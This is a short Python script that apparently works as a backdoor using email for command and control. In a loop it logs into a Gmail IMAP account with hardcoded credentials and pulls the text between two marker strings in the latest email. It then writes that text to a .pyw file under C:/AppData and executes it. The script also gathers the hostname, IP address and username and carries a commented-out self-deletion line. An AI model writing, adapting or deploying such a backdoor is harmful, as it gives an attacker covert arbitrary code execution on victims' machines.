import os
import time
import email
import socket
import getpass
import smtplib
import urllib
import imaplib
import re
import base64
#import CFCF

import imp


from socket import gethostname, gethostbyname
item = 'EthyHoh'
ll = 10
tip = 0
DIRt = '/Documents/'
ip = gethostbyname(gethostname())
ti = 0
tr = 0
MUS = socket.gethostname()
k = 0
mail = imaplib.IMAP4_SSL('imap.gmail.com')
mail.login('dumbdumbheadboy@gmail.com', 'Doris12345')
UserName = getpass.getuser()
Num = 0
Fmus = str(os.path.abspath("EthyHoh.py"))
#--------------
#os.remove(Fmus)
#--------------
DeskDoc = 'Desktop'
Inp = 0



CFC = open('C:/AppData/CFCF.pyw','w')
#clear
CFC.write("")
CFC.close()


while(True):

   mail.list()
   mail.select('inbox') # connect to inbox.
   result, data = mail.search(None, 'ALL')
   ids = data[0]
   id_list = ids.split()
   latest_email_id = id_list[-1] 
   result, data = mail.fetch(latest_email_id, '(RFC822)') 
   raw_email = data[0][1]
   s = (str(data))
   start = s.find('BNBN') + 7
   end = s.find('LaLa', start)
   C = s[start:end]
   Dstring = C.replace("\\r\\n", " ")
   Dstring2 = Dstring.replace("\\", "")    
   DS = str(Dstring2)

   CF = open('C:/AppData/CFCF.pyw','w')
   CF.write(DS)
   CF.close()
   

   
   
   
   os.system('C:/AppData/CFCF.pyw')
   #In CFCF, make sure that commands only run once, or at time to time
   
